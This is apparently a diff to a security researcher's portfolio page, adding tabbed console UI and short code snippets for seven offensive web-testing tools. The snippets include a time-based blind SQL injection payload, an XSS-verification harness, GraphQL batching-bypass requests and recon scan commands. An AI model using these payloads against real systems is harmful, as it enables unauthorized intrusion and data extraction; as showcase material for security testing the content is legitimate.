@@ -931,6 +931,214 @@
       min-height: 820px;
     }
 
+    /* No-Image Console Tabs, Attack Flow, and Code Snippets */
+    .console-tab-bar {
+      display: flex;
+      background: rgba(10, 14, 22, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 4px;
+      gap: 6px;
+      margin-bottom: 20px;
+    }
+
+    .console-tab-btn {
+      background: transparent;
+      border: none;
+      color: #94a3b8;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.8rem;
+      font-weight: 600;
+      padding: 8px 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      outline: none !important;
+    }
+
+    .console-tab-btn:hover {
+      color: #ffffff;
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .console-tab-btn.active {
+      background: #dc3545;
+      color: #ffffff;
+      box-shadow: 0 2px 10px rgba(220, 53, 69, 0.4);
+    }
+
+    /* Attack Flow Visualizer */
+    .attack-flow-box {
+      background: rgba(15, 23, 42, 0.7);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 8px;
+      padding: 16px 18px;
+      margin-bottom: 18px;
+    }
+
+    .attack-flow-title {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.74rem;
+      color: #38bdf8;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+    }
+
+    .attack-flow-steps {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .flow-step-node {
+      background: rgba(10, 14, 22, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 6px;
+      padding: 7px 12px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.2s ease;
+    }
+
+    .flow-step-node:hover {
+      border-color: rgba(220, 53, 69, 0.5);
+      transform: translateY(-2px);
+    }
+
+    .flow-step-node.flow-critical {
+      border-color: rgba(220, 53, 69, 0.7);
+      background: rgba(220, 53, 69, 0.12);
+    }
+
+    .step-idx {
+      background: #dc3545;
+      color: #ffffff;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.65rem;
+      font-weight: 700;
+      padding: 1px 5px;
+      border-radius: 3px;
+    }
+
+    .flow-step-node.flow-critical .step-idx {
+      background: #ff0033;
+    }
+
+    .step-name {
+      color: #cbd5e1;
+      font-size: 0.78rem;
+      font-weight: 600;
+    }
+
+    .flow-arrow-icon {
+      color: #64748b;
+      font-size: 0.75rem;
+    }
+
+    /* Code Snippet Box */
+    .code-snippet-container {
+      background: #06090e;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.8);
+      margin-bottom: 18px;
+    }
+
+    .code-snippet-bar {
+      background: #0d131d;
+      padding: 8px 14px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .code-snippet-lang {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.74rem;
+      color: #38bdf8;
+      font-weight: 600;
+    }
+
+    .code-copy-btn {
+      background: transparent;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      color: #cbd5e1;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.72rem;
+      padding: 2px 8px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .code-copy-btn:hover {
+      background: #dc3545;
+      color: #ffffff;
+      border-color: #dc3545;
+    }
+
+    .code-snippet-pre {
+      margin: 0;
+      padding: 16px;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.8rem;
+      line-height: 1.6;
+      color: #e2e8f0;
+      background: transparent;
+      max-height: 380px;
+      overflow-y: auto;
+      white-space: pre;
+    }
+
+    .code-snippet-pre::-webkit-scrollbar {
+      width: 5px;
+      height: 5px;
+    }
+
+    .code-snippet-pre::-webkit-scrollbar-thumb {
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 3px;
+    }
+
+    body.light-mode .console-tab-bar {
+      background: #f1f5f9;
+      border-color: rgba(0, 0, 0, 0.1);
+    }
+
+    body.light-mode .console-tab-btn {
+      color: #475569;
+    }
+
+    body.light-mode .console-tab-btn.active {
+      background: #dc3545;
+      color: #ffffff;
+    }
+
+    body.light-mode .attack-flow-box {
+      background: #f8fafc;
+      border-color: rgba(0, 0, 0, 0.08);
+    }
+
+    body.light-mode .flow-step-node {
+      background: #ffffff;
+      border-color: rgba(0, 0, 0, 0.1);
+    }
+
+    body.light-mode .step-name {
+      color: #0f172a;
+    }
+
+    body.light-mode .code-snippet-container {
+      background: #0f172a;
+    }
+
     /* Corner Crosshairs */
     .hud-crosshair {
       position: absolute;
@@ -4322,6 +4530,8 @@
     // ==========================================================================
     // Red Team Cyber Arsenal & Interactive Tool Inspector Controller (7 Master Tools)
     // ==========================================================================
+    // Production Security Tools & Interactive Inspector Controller (NO IMAGES)
+    // ==========================================================================
     const arsenalData = [
       {
         id: "authentix",
@@ -4332,12 +4542,12 @@
         name: "AUTHENTIX Enterprise v3.0.0",
         tagline: "Asynchronous Burp Suite Montoya Extension with 3-Way Differential IDOR & 16 Compound ATO Chains",
         threatScope: "OWASP Top 10 (A01:2021, A07:2021) • OWASP API Top 10 (API1, API2) • ASVS v4.0 • CVSS v3.1",
-        img: "assets/authentix_extension_dashboard.webp",
         benchmark: "14,880 Req/s Throughput • 34 Deterministic Invariants",
         demoUrl: "https://pratik-khairnar-sec.github.io/authentix-enterprise/",
         repoUrl: "https://github.com/pratik-khairnar-sec/authentix-enterprise",
-        cloneCmd: "git clone https://github.com/pratik-khairnar-sec/authentix-enterprise.git",
+        cloneCmd: "git clone https://github.com/pratik-khairnar-sec/authentix-enterprise.git && mvn clean package",
         breakthrough: "Eliminates authorization false positives through an asynchronous 3-Way Differential IDOR Engine (comparing Attacker, Victim, and Unauthenticated/Admin contexts) coupled with Soft-200 Heuristic Disambiguation. Automatically correlates session state machines across 34 invariants to construct 16 compound Account Takeover (ATO) exploit chains.",
+        flowSteps: ["Live Proxy Ingestion", "3-Way Context Mutator", "Differential Comparator", "Soft-200 Heuristic Filter", "ATO Exploit Dispatcher"],
         vectors: [
           "3-Way Differential IDOR",
           "Soft-200 Error Disambiguation",
@@ -4347,7 +4557,32 @@
           "OAuth2 Flow Tampering"
         ],
         specs: ["Java 17/21", "PortSwigger Montoya API", "FlatLaf Darcula UI", "ThreadPoolExecutor", "Jackson JSON"],
-        terminalLog: `[+] AUTHENTIX Enterprise v3.0.0 Engine Initialized (Montoya API 2024.1)
+        codeLang: "Java 17/21 (PortSwigger Montoya API)",
+        codeSnippet: `// 3-Way Differential IDOR Engine & Soft-200 Disambiguation (Montoya API)
+public class DifferentialAuditEngine {
+    public AuditResult evaluate(HttpRequestResponse origin) {
+        HttpRequest victimReq = origin.request();
+        HttpRequest attackerReq = victimReq.withHeader("Cookie", attackerSessionCookie);
+        HttpResponse attackerResp = api.http().sendRequest(attackerReq);
+
+        double similarity = LevenshteinSimilarity.ratio(origin.response().body(), attackerResp.body());
+        boolean isSoft200 = Soft200Classifier.isGenericEnvelope(attackerResp.body());
+
+        if (attackerResp.statusCode() == 200 && similarity > 0.92 && !isSoft200) {
+            AuditIssue issue = AuditIssue.create(
+                "CRITICAL: 3-Way Differential IDOR",
+                "High-severity authorization bypass leaking victim PII across tenant boundary.",
+                AuditIssueSeverity.HIGH,
+                AuditIssueConfidence.CERTAIN,
+                attackerReq
+            );
+            api.siteMap().add(issue);
+            return AuditResult.VULNERABLE;
+        }
+        return AuditResult.SECURE;
+    }
+}`,
+        terminalLog: `[+] AUTHENTIX Enterprise v3.0.0 Initialized (Montoya API 2024.1)
 [*] Asynchronous ThreadPool active (8 worker threads, queue: 1024)
 [*] Injecting 3-Way Context Matrix: [Attacker: User_0x42] vs [Victim: User_0x99]
 --> POST /api/v2/account/profile HTTP/1.1 (Victim Context: HTTP 200 OK | Body: 4,120 bytes)
@@ -4368,12 +4603,12 @@
         name: "ReconForge v4.0",
         tagline: "Multi-Target Bug Bounty Reconnaissance Operating System with 30 Master Phases & 52,630+ Dork Vault",
         threatScope: "External Attack Surface Management (EASM) • OSINT Threat Profiling • NIST SP 800-115",
-        img: "assets/reconforge_hero_dashboard.webp",
         benchmark: "52,630+ Curated Dorks • 30 Master Phases • 100% Offline Client-Side",
         demoUrl: "https://pratik-khairnar-sec.github.io/ReconForge/",
         repoUrl: "https://github.com/pratik-khairnar-sec/ReconForge",
         cloneCmd: "git clone https://github.com/pratik-khairnar-sec/ReconForge.git",
         breakthrough: "Standardizes disparate reconnaissance workflows into a unified 30-phase offensive pipeline. Features an offline, zero-telemetry vault of 52,630+ indexed Google, GitHub, and Shodan dorks, generating 1-click weaponized execution chains for Subfinder, HTTPX, Katana, Nuclei, and Gau.",
+        flowSteps: ["Target Scope Domain", "Subdomain Permutation Engine", "30-Phase Dork Vault", "Automated Tool Generator", "Weaponized Bash Dispatch"],
         vectors: [
           "Subdomain Permutation Matrix",
           "Leaked S3 / GCP Storage Buckets",
@@ -4383,6 +4618,25 @@
           "Shadow API Endpoint Discovery"
         ],
         specs: ["Vanilla ES6+ JS", "Web Crypto API", "Web Workers (Offline)", "Tailwind / Custom CSS", "Zero Telemetry"],
+        codeLang: "JavaScript (ES6 Modules, Web Crypto API)",
+        codeSnippet: `// 30-Phase Multi-Target Attack Surface Generator & Offline Dork Vault
+export async function compileReconPipeline(targetDomain) {
+  const indexedVault = await loadOfflineDorkVault({ cipher: "SHA-256", localWorker: true });
+  const activePhases = [1, 2, 8, 14, 22, 30]; // Certs, DNS, Storage, Files, APIs, WAF
+
+  const executionMatrix = activePhases.map(phaseId => {
+    return {
+      phase: phaseId,
+      dorks: indexedVault.filter(d => d.phase === phaseId && d.matchesTarget(targetDomain)),
+      cliCommands: {
+        subfinder: "subfinder -d " + targetDomain + " -all -silent | httpx -status-code",
+        katana: "katana -u https://" + targetDomain + " -d 4 -jc -kf -silent | uro",
+        nuclei: "nuclei -u https://" + targetDomain + " -t cves/,vulnerabilities/ -severity critical,high"
+      }
+    };
+  });
+  return generateOfflineExecutionBundle(executionMatrix);
+}`,
         terminalLog: `[+] ReconForge v4.0 Initialized | Target Domain: target.com
 [*] Loading Master Dork Vault (52,630 entries across 30 operational categories)...
 [Phase 01] Passive Certificate Transparency & Subdomain Permutations:
@@ -4404,12 +4658,12 @@
         name: "Reflectra v7.0.0",
         tagline: "Context-Aware DOM XSS Engine Verifying Real Execution via Headless Chrome Dialog Interception",
         threatScope: "OWASP Top 10 (A03:2021 Injection) • ASVS v4.0 5.3 • CWE-79",
-        img: "assets/reflectra_dashboard.webp",
         benchmark: "2,600+ Context Payloads • 0.00% False Positive Rate • CDP Interception",
         demoUrl: "https://pratik-khairnar-sec.github.io/Reflectra/",
         repoUrl: "https://github.com/pratik-khairnar-sec/Reflectra",
-        cloneCmd: "git clone https://github.com/pratik-khairnar-sec/Reflectra.git",
+        cloneCmd: "git clone https://github.com/pratik-khairnar-sec/Reflectra.git && pip install -r requirements.txt",
         breakthrough: "Solves regex scanner false positives by hooking into the Chrome DevTools Protocol (CDP). Evaluates DOM source-to-sink flows across HTML, attribute, script, and URI contexts, confirming vulnerabilities only when real JavaScript execution fires intercepted dialog events (alert, prompt, confirm).",
+        flowSteps: ["DOM Source Injection", "AST Context Lexer", "Context Payload Prioritizer", "Headless Chrome CDP Hook", "Dialog Verification (0% FP)"],
         vectors: [
           "DOM-based XSS",
           "Source-to-Sink Dataflow Triage",
@@ -4419,6 +4673,32 @@
           "Deterministic PoC Reproduction"
         ],
         specs: ["Python 3", "Playwright / CDP", "Headless Chromium", "AST Lexical Tokenizer", "Colorama"],
+        codeLang: "Python 3 (Playwright & Chrome DevTools Protocol)",
+        codeSnippet: `# Headless Chrome CDP Dialog Interception - 0.00% False Positive Verification
+import asyncio
+from playwright.async_api import async_playwright
+
+async def audit_dom_xss_sink(target_url: str, payload: str):
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=True)
+        context = await browser.new_context()
+        page = await context.new_page()
+        dialog_captured = asyncio.Event()
+
+        # Intercept native JavaScript dialogs (alert, prompt, confirm)
+        page.on("dialog", lambda d: (dialog_captured.set(), d.dismiss()))
+        
+        test_url = f"{target_url}?query={payload}"
+        await page.goto(test_url, timeout=5000, wait_until="domcontentloaded")
+        
+        if dialog_captured.is_set():
+            return {
+                "status": "VULNERABLE",
+                "proof": test_url,
+                "confidence": "100%_DETERMINISTIC",
+                "dialog_event": "Window.alert() executed successfully in DOM"
+            }
+        return {"status": "SAFE"}`,
         terminalLog: `[+] Reflectra v7.0.0 — Context-Aware DOM XSS Auditing Engine
 [*] Target URL: https://app.target.corp/search?q=FUZZ
 [*] Analyzing DOM Context: Sink located inside <script> tag: var query = "FUZZ";
@@ -4441,12 +4721,12 @@
         name: "BlindStrike v7.0.0",
         tagline: "Algorithmic Time-Based & Boolean Blind SQLi Framework with Statistical IQR Jitter Filtering",
         threatScope: "OWASP Top 10 (A03:2021 Injection) • SANS Top 25 • CWE-89",
-        img: "assets/blindstrike_dashboard.webp",
         benchmark: "IQR Latency Jitter Filtering • Multi-Threaded Character Extraction • 5 DB Engines",
         demoUrl: "https://pratik-khairnar-sec.github.io/BlindStrike/",
         repoUrl: "https://github.com/pratik-khairnar-sec/BlindStrike",
-        cloneCmd: "git clone https://github.com/pratik-khairnar-sec/BlindStrike.git",
+        cloneCmd: "git clone https://github.com/pratik-khairnar-sec/BlindStrike.git && pip install -r requirements.txt",
         breakthrough: "Eliminates network latency variance in time-based blind SQL injection using Interquartile Range (IQR) Statistical Outlier Filtering (Q3 + 1.5 * IQR). Baselines dynamic round-trip times and executes multi-threaded binary search character extraction across 5 major database engines.",
+        flowSteps: ["Latency Baseline (50 Samples)", "IQR Filter (Q3 + 1.5*IQR)", "Time-Delay Injection", "Threshold Evaluation", "Binary Search Character Extraction"],
         vectors: [
           "Time-Based Blind SQLi",
           "Boolean Blind SQLi",
@@ -4456,6 +4736,25 @@
           "Binary Search Character Extraction"
         ],
         specs: ["Python 3", "NumPy", "Persistent Keep-Alive HTTP", "Concurrent.Futures", "Thread-Safe SQLite"],
+        codeLang: "Python 3 (NumPy & Concurrent.Futures)",
+        codeSnippet: `# Algorithmic Interquartile Range (IQR) Network Jitter Filtering for Blind SQLi
+import numpy as np, requests
+
+def calibrate_network_threshold(target_url: str, samples: int = 50) -> float:
+    rtts = [requests.get(target_url).elapsed.total_seconds() for _ in range(samples)]
+    q25, q75 = np.percentile(rtts, [25, 75])
+    iqr = q75 - q25
+    outlier_cutoff = q75 + (1.5 * iqr) # Exclude Internet jitter fluctuations
+    return max(outlier_cutoff, 0.5)
+
+def extract_blind_char(url: str, param: str, index: int, delay: int = 5) -> str:
+    threshold = calibrate_network_threshold(url)
+    payload = f"' OR IF(ASCII(SUBSTRING((SELECT database()),{index},1))>100,SLEEP({delay}),0)-- -"
+    measured_time = requests.get(f"{url}?{param}={payload}").elapsed.total_seconds()
+    
+    if measured_time >= (delay - 0.2) and measured_time > threshold:
+        return True # Deterministic boolean outcome without false-alarm latency spikes
+    return False`,
         terminalLog: `[+] BlindStrike v7.0.0 — Statistical Blind SQLi Framework
 [*] Calibrating baseline network latency (50 samples)...
     [+] Mean RTT: 41.2ms | Standard Deviation: 3.1ms | IQR: 4.8ms
@@ -4480,12 +4779,12 @@
         name: "TaintQL v2.0.0",
         tagline: "GraphQL Security Auditor Parsing Query ASTs for Introspection Leaks, Depth Limits & Batching Bypasses",
         threatScope: "OWASP API Security Top 10 (API4:2023, API8:2023) • GraphQL Security Standard",
-        img: "assets/11_presentation_cover.png",
         benchmark: "27/27 Pytest Tests Passing • AST Query Tokenizer • Burp Proxy Integration",
         demoUrl: "https://github.com/pratik-khairnar-sec/TaintQL",
         repoUrl: "https://github.com/pratik-khairnar-sec/TaintQL",
-        cloneCmd: "git clone https://github.com/pratik-khairnar-sec/TaintQL.git",
+        cloneCmd: "git clone https://github.com/pratik-khairnar-sec/TaintQL.git && pytest tests/",
         breakthrough: "Compiles GraphQL queries into Abstract Syntax Trees (AST) to evaluate recursion depth limits, schema introspection disclosures, and batching rate-limit bypasses. Hooks client mutation events in Playwright and proxies traffic through Burp Suite for automated field discovery.",
+        flowSteps: ["Schema Introspection Scanner", "Query AST Tokenizer", "Recursive Depth Calculator", "Alias Batching Multiplier", "Burp Proxy Telemetry"],
         vectors: [
           "Schema Introspection Exposure",
           "Recursive Query Depth Exhaustion",
@@ -4495,6 +4794,23 @@
           "AST Token Stream Mutation"
         ],
         specs: ["Python 3", "GraphQL-Core AST", "Playwright", "Pytest (27/27 Passing)", "Burp Proxy Upstream"],
+        codeLang: "Python 3 (GraphQL-Core AST Engine)",
+        codeSnippet: `# GraphQL Query AST Tokenizer & Recursive Depth Limiter Audit
+from graphql import parse, FieldNode, OperationDefinitionNode
+
+def calculate_ast_recursion_depth(node, depth: int = 0) -> int:
+    if not hasattr(node, 'selection_set') or not node.selection_set:
+        return depth
+    max_sub_depth = depth
+    for selection in node.selection_set.selections:
+        if isinstance(selection, FieldNode) and selection.selection_set:
+            sub = calculate_ast_recursion_depth(selection, depth + 1)
+            max_sub_depth = max(max_sub_depth, sub)
+    return max_sub_depth
+
+def test_alias_batching_bypass(endpoint: str, query_name: str, count: int = 200):
+    batched_body = "query { " + " ".join([f"a{i}: {query_name} {{ id }}" for i in range(count)]) + " }"
+    return requests.post(endpoint, json={"query": batched_body})`,
         terminalLog: `[+] TaintQL v2.0.0 — GraphQL AST Security Auditor
 [*] Scanning Endpoint: https://api.target.corp/graphql
 [Phase 1] Schema Introspection Analysis:
@@ -4517,12 +4833,12 @@
         name: "CORSair v3.0.0",
         tagline: "In-Browser CORS Security Testing Suite with Dynamic Reflection Verification & Shannon Entropy Calculations",
         threatScope: "OWASP Top 10 (A05:2021 Security Misconfiguration) • ASVS v4.0 14.4",
-        img: "assets/corsair_dashboard.webp",
         benchmark: "Shannon Entropy Calculation • Dynamic ACAC/ACAO Verification • 1-Click PoC Generator",
         demoUrl: "https://pratik-khairnar-sec.github.io/CORSair/",
         repoUrl: "https://github.com/pratik-khairnar-sec/CORSair",
         cloneCmd: "git clone https://github.com/pratik-khairnar-sec/CORSair.git",
         breakthrough: "Audits CORS policy implementations against 14 complex bypass patterns (null origin, regex dot unescapes, prefix/suffix trust). Measures Shannon Entropy on reflected responses to distinguish between harmless public markup and high-entropy secret token disclosures.",
+        flowSteps: ["Origin Reflection Matrix", "14-Pattern Bypass Engine", "Credential Header Inspector", "Shannon Entropy Secret Filter", "Automated HTML PoC Exporter"],
         vectors: [
           "ACAC / ACAO Wildcard Exploitation",
           "Null Origin Trust Abuse",
@@ -4532,6 +4848,25 @@
           "Automated Exploit HTML PoC Builder"
         ],
         specs: ["HTML5 / ES6 Modules", "Shannon Entropy Engine", "Bootstrap 5 Dark", "CORS Preflight Tester"],
+        codeLang: "JavaScript (ES6 Modules & Shannon Entropy)",
+        codeSnippet: `// Dynamic CORS Reflection Verification & Shannon Entropy Secret Detection
+export function analyzeCORSResponse(headers, body) {
+  const acao = headers.get("access-control-allow-origin");
+  const acac = headers.get("access-control-allow-credentials");
+  
+  if (acac === "true" && (acao === "null" || acao.includes("attacker.com"))) {
+    const entropy = computeShannonEntropy(body);
+    const hasSensitiveToken = entropy > 4.5; // High entropy indicates cryptographic secrets/JWTs
+    
+    return {
+      severity: "CRITICAL",
+      impact: "Arbitrary authenticated cross-origin data exfiltration",
+      entropyScore: entropy.toFixed(2),
+      exploitHtml: generateCORSExploitPoC(acao)
+    };
+  }
+  return { severity: "LOW", status: "Secure origin policy" };
+}`,
         terminalLog: `[+] CORSair v3.0.0 — Cross-Origin Resource Sharing Auditor
 [*] Target API: https://banking.target.corp/api/v1/user/private-data
 [*] Testing Origin Reflection Matrix:
@@ -4553,12 +4888,12 @@
         name: "WaybackLens v1.0.0",
         tagline: "Chrome Extension (MV3) for Real-Time Wayback Machine CDX Endpoint Reconnaissance & Risk Scoring",
         threatScope: "Historical Endpoint Recon • Unmapped Attack Surface • Sensitive File Leakage",
-        img: "assets/wayback_lens_dashboard.webp",
         benchmark: "Real-Time CDX Streaming • Heuristic Security Risk Scoring • Live 200 HTTP Probe",
         demoUrl: "https://pratik-khairnar-sec.github.io/wayback-lens/",
         repoUrl: "https://github.com/pratik-khairnar-sec/wayback-lens",
         cloneCmd: "git clone https://github.com/pratik-khairnar-sec/wayback-lens.git",
         breakthrough: "Streams historical endpoints directly from the Internet Archive Wayback CDX API without memory exhaustion. Applies a real-time heuristic security classifier to identify dangerous extensions (.env, .git, .sql, .bak) and active API routes, enabling 1-click export to Burp Suite scope.",
+        flowSteps: ["Active Tab Domain Hook", "CDX Stream Ingestion", "Heuristic Risk Classifier", "Live 200 HTTP Probe", "Burp Scope JSON Exporter"],
         vectors: [
           "Historical Endpoint Recon",
           "Unindexed Admin Portals",
@@ -4568,6 +4903,27 @@
           "Direct Burp Scope Export"
         ],
         specs: ["Chrome Extensions (MV3)", "JavaScript ES6", "Web Streams API", "IndexedDB Cache", "Service Workers"],
+        codeLang: "JavaScript (Chrome Extensions Manifest V3)",
+        codeSnippet: `// Chrome Extension (MV3) Wayback CDX Stream Parser & Risk Classifier
+async function streamAndClassifyHistoricalEndpoints(targetDomain) {
+  const cdxUrl = "https://web.archive.org/cdx/search/cdx?url=*." + targetDomain + "/*&output=json&fl=original,statuscode";
+  const response = await fetch(cdxUrl);
+  const reader = response.body.pipeThrough(new TextDecoderStream()).getReader();
+
+  const highRiskRegex = /\\.(env|git|sql|bak|yaml|log)$|\\/(admin|internal|api\\/debug|swagger|graphql)\\//i;
+  const categorized = { critical: [], normal: [] };
+
+  while (true) {
+    const { value, done } = await reader.read();
+    if (done) break;
+    const lines = value.split("\\n");
+    for (const line of lines) {
+      if (highRiskRegex.test(line)) categorized.critical.push(line);
+      else categorized.normal.push(line);
+    }
+  }
+  return categorized;
+}`,
         terminalLog: `[+] WaybackLens v1.0.0 (Chrome MV3) Active
 [*] Intercepting active tab domain: finance.target.corp
 [*] Streaming CDX records from archive.org...
@@ -4582,7 +4938,7 @@
 
     let activeWeaponIndex = 0;
     let currentFilter = 'all';
-    let scanlinesEnabled = true;
+    let currentConsoleTab = 'architecture';
 
     function renderArsenalDeck() {
       const deckEl = document.getElementById('arsenalDeck');
@@ -4594,7 +4950,7 @@
         return;
       }
 
-      deckEl.innerHTML = filtered.map((item, idx) => {
+      deckEl.innerHTML = filtered.map((item) => {
         const globalIdx = arsenalData.findIndex(w => w.id === item.id);
         const isActive = globalIdx === activeWeaponIndex;
         return `
@@ -4653,71 +5009,121 @@
           </div>
         </div>
 
-        <!-- Viewport & Tech Breakdown -->
-        <div class="dossier-viewport-box">
-          <!-- Left: Viewport Image Frame -->
-          <div class="viewport-img-frame" onclick="openCertModal('custom', '${item.img}', '${item.name} Architecture & Dashboard')">
-            <div class="viewport-telemetry-badge">
-              <i class="fas fa-bolt text-danger mr-1"></i> ${item.benchmark}
+        <!-- Interactive Sub-Tab Bar -->
+        <div class="console-tab-bar">
+          <button class="console-tab-btn ${currentConsoleTab === 'architecture' ? 'active' : ''}" onclick="switchConsoleTab('architecture')">
+            <i class="fas fa-microchip mr-2"></i>Architecture &amp; Pipeline
+          </button>
+          <button class="console-tab-btn ${currentConsoleTab === 'code' ? 'active' : ''}" onclick="switchConsoleTab('code')">
+            <i class="fas fa-code mr-2"></i>Source Code Harness
+          </button>
+          <button class="console-tab-btn ${currentConsoleTab === 'terminal' ? 'active' : ''}" onclick="switchConsoleTab('terminal')">
+            <i class="fas fa-terminal mr-2"></i>Live Execution Telemetry
+          </button>
+        </div>
+
+        <!-- TAB 1: Architecture & Pipeline -->
+        <div id="tabArchitecture" style="display: ${currentConsoleTab === 'architecture' ? 'block' : 'none'};">
+          <!-- Attack Flow Visualizer -->
+          <div class="attack-flow-box">
+            <div class="attack-flow-title">
+              <i class="fas fa-diagram-project mr-1"></i> Vulnerability Execution Pipeline
             </div>
-            <img src="${item.img}" alt="${item.name} Dashboard" loading="lazy">
-            <div class="crt-overlay ${scanlinesEnabled ? '' : 'disabled'}" id="crtOverlay"></div>
-            <div class="viewport-tools-bar" onclick="event.stopPropagation()">
-              <button class="viewport-tool-btn" onclick="toggleScanlines()" title="Toggle CRT Scanline HUD Effect">
-                <i class="fas fa-tv mr-1"></i> CRT: ${scanlinesEnabled ? 'ON' : 'OFF'}
-              </button>
-              <button class="viewport-tool-btn" onclick="openCertModal('custom', '${item.img}', '${item.name} Architecture & Dashboard')" title="Inspect Fullscreen Lightbox">
-                <i class="fas fa-expand mr-1"></i> Expand
-              </button>
+            <div class="attack-flow-steps">
+              ${item.flowSteps.map((step, idx) => `
+                <div class="flow-step-node ${idx === item.flowSteps.length - 1 ? 'flow-critical' : ''}">
+                  <span class="step-idx">0${idx + 1}</span>
+                  <span class="step-name">${step}</span>
+                </div>
+                ${idx < item.flowSteps.length - 1 ? '<i class="fas fa-chevron-right flow-arrow-icon"></i>' : ''}
+              `).join('')}
             </div>
           </div>
 
-          <!-- Right: Technical Intelligence -->
-          <div class="dossier-tech-pane">
-            <div class="dossier-breakthrough-box">
-              <div class="breakthrough-label"><i class="fas fa-microchip mr-1"></i> Architectural Breakthrough:</div>
-              <p class="breakthrough-text">${item.breakthrough}</p>
-            </div>
+          <!-- Technical Breakdown -->
+          <div class="dossier-breakthrough-box">
+            <div class="breakthrough-label"><i class="fas fa-microchip mr-1"></i> Architectural Breakthrough:</div>
+            <p class="breakthrough-text">${item.breakthrough}</p>
+          </div>
 
-            <div class="dossier-vectors-box">
-              <div class="vectors-label"><i class="fas fa-shield-virus mr-1"></i> Deterministic Attack Vectors Covered:</div>
-              <div class="vectors-chips">
-                ${item.vectors.map(v => `<span class="vector-chip"><i class="fas fa-check-circle mr-1" style="font-size: 0.65rem;"></i>${v}</span>`).join('')}
-              </div>
+          <div class="dossier-vectors-box">
+            <div class="vectors-label"><i class="fas fa-shield-virus mr-1"></i> Deterministic Attack Vectors Covered:</div>
+            <div class="vectors-chips">
+              ${item.vectors.map(v => `<span class="vector-chip"><i class="fas fa-check-circle mr-1" style="font-size: 0.65rem;"></i>${v}</span>`).join('')}
             </div>
+          </div>
 
-            <div class="dossier-specs-row">
-              ${item.specs.map(s => `<span class="spec-chip">${s}</span>`).join('')}
-            </div>
+          <div class="dossier-specs-row mt-3">
+            <span class="spec-chip text-info"><i class="fas fa-bolt mr-1"></i>${item.benchmark}</span>
+            ${item.specs.map(s => `<span class="spec-chip">${s}</span>`).join('')}
           </div>
         </div>
 
-        <!-- Interactive Terminal Sandbox -->
-        <div class="arsenal-term-sandbox">
-          <div class="term-sandbox-bar">
-            <div class="term-window-dots">
-              <span class="term-dot term-dot-red"></span>
-              <span class="term-dot term-dot-yellow"></span>
-              <span class="term-dot term-dot-green"></span>
+        <!-- TAB 2: Source Code Harness -->
+        <div id="tabCode" style="display: ${currentConsoleTab === 'code' ? 'block' : 'none'};">
+          <div class="code-snippet-container">
+            <div class="code-snippet-bar">
+              <span class="code-snippet-lang"><i class="fas fa-file-code mr-1"></i> ${item.codeLang}</span>
+              <button class="code-copy-btn" onclick="copySnippetCode(this)">
+                <i class="fas fa-copy mr-1"></i> Copy Code
+              </button>
             </div>
-            <div class="term-sandbox-title">
-              <i class="fas fa-terminal text-danger mr-1"></i> LIVE TELEMETRY LOG // ${item.codex}
-            </div>
-            <button class="term-rerun-btn" onclick="rerunTermSimulation()">
-              <i class="fas fa-rotate-right mr-1"></i> Re-run Simulation
-            </button>
+            <pre class="code-snippet-pre" id="activeSnippetCode"><code>${escapeHtml(item.codeSnippet)}</code></pre>
           </div>
-          <div class="term-sandbox-body" id="termSandboxBody">${formatTerminalLog(item.terminalLog)}</div>
+        </div>
+
+        <!-- TAB 3: Live Execution Telemetry -->
+        <div id="tabTerminal" style="display: ${currentConsoleTab === 'terminal' ? 'block' : 'none'};">
+          <div class="arsenal-term-sandbox">
+            <div class="term-sandbox-bar">
+              <div class="term-window-dots">
+                <span class="term-dot term-dot-red"></span>
+                <span class="term-dot term-dot-yellow"></span>
+                <span class="term-dot term-dot-green"></span>
+              </div>
+              <div class="term-sandbox-title">
+                <i class="fas fa-terminal text-danger mr-1"></i> LIVE TELEMETRY LOG // ${item.codex}
+              </div>
+              <button class="term-rerun-btn" onclick="rerunTermSimulation()">
+                <i class="fas fa-rotate-right mr-1"></i> Re-run Simulation
+              </button>
+            </div>
+            <div class="term-sandbox-body" id="termSandboxBody">${formatTerminalLog(item.terminalLog)}</div>
+          </div>
         </div>
       `;
     }
 
+    function switchConsoleTab(tabName) {
+      currentConsoleTab = tabName;
+      renderDossierConsole();
+    }
+
+    function escapeHtml(str) {
+      return str
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+
+    function copySnippetCode(btn) {
+      const codeEl = document.getElementById('activeSnippetCode');
+      if (!codeEl) return;
+      navigator.clipboard.writeText(codeEl.innerText).then(() => {
+        const orig = btn.innerHTML;
+        btn.innerHTML = '<i class="fas fa-check text-success mr-1"></i> Copied!';
+        setTimeout(() => { btn.innerHTML = orig; }, 2000);
+      });
+    }
+
     function formatTerminalLog(raw) {
       return raw
-        .replace(/\n/g, '<br>')
-        .replace(/(\[\+\])/g, '<span style="color: #34d399; font-weight: bold;">$1</span>')
-        .replace(/(\[\*\])/g, '<span style="color: #38bdf8; font-weight: bold;">$1</span>')
